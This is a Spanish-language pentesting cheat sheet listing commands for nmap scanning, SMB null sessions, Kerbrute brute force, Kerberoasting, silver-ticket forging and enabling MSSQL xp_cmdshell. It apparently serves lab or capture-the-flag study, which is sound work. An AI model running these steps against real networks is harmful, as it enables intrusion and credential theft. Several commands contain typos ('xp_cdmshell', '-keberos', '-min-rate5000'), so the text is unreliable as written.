# Escaneo a todos los puertos abiertos TCP(65536) con NMAP
sudo nmap -open -tcp -p- -sS -min-rate5000 -n -Pn xxx.xxx.xxx.xxx -oG allports

# Escaneo con scripts de reconocimiento de servicios en los puertos abiertos con NMAP
nmap -pp1,p2,p3,p4,p5 -sCV xxx.xxx.xxx.xxx -oN targeted


# ----- SAMBA 445 -----
# Si esta corriendo el servicio de Samba - Puerto 445

	# Enumerar el servicio smb para conocer el nombre de la maquina y el dominio
	crackmapexec smb xxx.xxx.xxx.xxx 
	
	# Listar los recursos compartidos por samba con una sesion nula
	smbclient -L xxx.xxx.xxx.xxx -N

	# Si hay recursos compartidos 
	# Revisar que privilegios tenemos sobre los recursos
	smbmap -H xxx.xxx.xxx.xxx -u none
	
	# Si tenemos acceso a recursos compratidos SMB
	# Nos conectamos a revisar que archivos hay 
	smbclient //xxx.xxx.xxx.xxx/Recurso
	# Conectado al recurso SMB podemos manupular los archivos con los comandos
	ls - Listar a|rchivos
	get - Descargar archivo a nuestra maquina
	put - Subir archivo a la maquina victima

# Cuando tengamos acceso a archivos de configuracion simpre revisarlos para ver si hay credenciales en codigo duro
# Si tenemos acceo a archivos binarios usamos strings para imprimir las cadenas de caracteres imprimibles
strings archivo.exe
# Los binarios podemos especificar el numero de la cadena de caracteres y algunas veces se ve mejor la informacion
string -e l archivo.exe
# Para debugear y revisar como esta estructurado el codigo de un binario podemos usar dnSpy (Github dnSpy)
# Otra alternativa es doPeek (Github doPeek) 

###############################
######  Maquina Windows  ######
###############################

# ----- KERBEROS 88 -----
# Si esta expuesto el servicio de Kerberos - Puerto 88

	# Se pueden enumerar cuentas del directorio activo por fuerza bruta con la herramienta Kerbrute (Github Kerbrute)
	kerbrute userenum -d dominio.com -dc xxx.xxx.xxx.xxx userlist
	# Se pueden enumerar cuentas desde un diccionario predefinido como los de seclist
	kerbrute userenum -d dominio.com -dc xxx.xxx.xxx.xxx /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt
	
# Teniendo usuarios validos podemos probar con fuerza bruta listados de passwords con Kerbrute
kerbrute bruteuser --dc xxx.xxx.xxx.xxx -d dominio.com /usr/lista/passs.txt user

# Teniendo credenciales validas(Ususario y Password) podemos hacer un Kerberoasting attack con GetUserSPNs.py
# Herramienta parte de Impacket (scripts de python)
GetUserSPNs.py dominio.com/username:password -k -dc-ip dominio.com
# Hacemos un request de tipo TGS (Ticket Granting Services) para traernos el hash
GetUserSPNs.py dominio.com/username:password -k -dc-ip dominio.com -request 
# Si obtenemos el Hash hay que intentarlo crackear (Lo podemos intentar con John the Ripper y el directorio Rockyou)
john -w:/usr/share/wordlist/rockyou.txt hash
#Si tenemos credenciales validas tambien podemos solicitar un TGT con getTGT.py para utilizarlo como autenticacion de Kerberos
getTGT.py dominio.com/username:password
#Una vez que tenemos el ticket tenemos que exportarlo a la variable KRB5CCNAME para su uso
export KRB5CCNAME=ticket.cache

- Silver Ticket Attack -
# Si no te has logrado conectar aun a algun serrvicio por medio de keberos, otra opcion es el Silver Ticket Attack
# Usar el script ticketer.py, necesitamos tres cosas el Hash NTML, Domain SID (getPac.py) con y el SPN
# Primero obtenemos el Domain SID
getPac.py domain.com/username:password -targetUser Administrator 
# El ntml hash lo podemos generar basado en el password (NTLM Generator)
# El SPN lo obtenemos con GetUserSPNs.py
# Teniendo los 3 valores creamos el Silver Ticket 
ticketer.py -spn SERVICIO/domain.com.local -domain-sid x-x-x-xx-xxxxxxxxxxx-xxxxxxxx-xxxxxx -dc-ip dc.domino.com -nthash hash -domain domino.com.local
# Con el ticket generado lo exportamos a la variable KRB5CCNAME y probamos conectarnos







# ----- MSSQL Server 1433 -----
# Si esta abierto el puerto y corriendo el servicio de SQL Server se puede uno conectar con mssqlclient.py
mssqlclient.py dominio.com/username:password@xxx.xxx.xxx.xxx
# Si tenenmos un ticket valido de Kerberos con el parsamotro -k nos podemos conectar directo al servicio
mssqlclient.py dominio.com/username:password@xxx.xxx.xxx.xxx -keberos
# Conectado a la BD MSSQL se pueden ejecutar comandos de sistema con xp_cmdshell
xp_cmdshell "whoami"
# Si no esta habilitado el cmdshell lo puedes configurar
SP_CONFIGURE "show advanced options", 1
RECONFIGURE
SP_CONFIGURE "xp_cdmshell", 1
RECONFIGURE



# Teniendo credenciales validas podemos enumerar el directorio activo con la herramient RPCClient
rpcclient -U 'username%password' -c 'enumdomusers' --> Se conecta y ejecuta el comando para enumerar usuarios del dominio
rpcclient -U 'username%password' -->  Conectarse en modo interactivo
rpcclient $> enumdomusers  --> Enumerar Usuarios
rpcclient $> enumdomgroups --> Enumerar Grupos del Dominio

# Informacion de usarios del LDAP con ldapsearch
ldapsearch -x -H ldap://xxx.xxx.xxx.xxx -D 'username@dominio.com' -w 'Password' -b "DC=domino,DC=com"




###############################
######   Maquina Linux   ######
###############################


# Posibles herramientas a utilizar en esta fase

○ Whatweb
○ Webalizer
○ Buscar subdominios
○ Buscar directorio
○ Buscar paneles de administración
○ Local File Inclusion
○ Verificar SQL Injection
○ Request analisis Burpsuite

